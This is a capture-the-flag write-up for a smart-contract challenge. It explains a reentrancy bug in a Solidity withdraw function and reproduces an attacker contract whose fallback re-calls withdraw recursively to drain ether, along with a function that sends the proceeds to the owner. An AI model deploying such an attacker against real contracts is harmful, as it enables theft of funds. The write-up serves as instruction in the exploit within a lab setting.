# Get Rich

This challenge gave us a smart contract and an api to interact with the
blockchain it was running on. Our goal is to drain the smart contract of funds.

Note: due to inefficiencies and issues with my code, I will not use my code, but I will instead explain the solution published by the creator of the challenge: https://pastebin.com/KXAuwRXS.

I used remix to edit the attacking smart contract: https://remix.ethereum.org/

Looking at the solidity contract given to us, the only line that stood out to me was line 62: msg.sender.call.value(amount)(). If it is returning ether to a payable smart contract, it will wait for the smart contract to finish executing the code in its fallback function before continuing. If an attacker smart contract recursively calls the withdraw() function, it will not subtract from the attacker’s balance until after refunding each recursive call. This means that an attacker can withdraw all the ether in the victim smart contract.

```
// Start the attack
function attack()  {
    performAttack = true;
    dctf.invest.value(1)(this); // Need to invest a bit to get started.
    dctf.withdraw(1);
}

// Fallback (Called when the contract is paid and another function is not
called)
function() payable {
    if (performAttack) {
        performAttack = false;
        dctf.withdraw(1); // Recursively called
    }
}
```

After successfully exploiting the contract, the flag can be obtained by
transferring the ether to an owned wallet and calling get_flag.

```
function getJackpot(){
    dctf.withdraw(dctf.balance); // Withdraw monies just in case
    bool res = owner.send(this.balance); // Send all the ether to you
    performAttack = true;
}
```

Due to a bug in my code, I did not actually withdraw any ether, but I did underflow my smart contract’s balance. I then transferred my balance (~1e77) to my wallet and withdrew 100 ether from the victim contract.

It turns out that this is the same exploit used during the DAO hack.

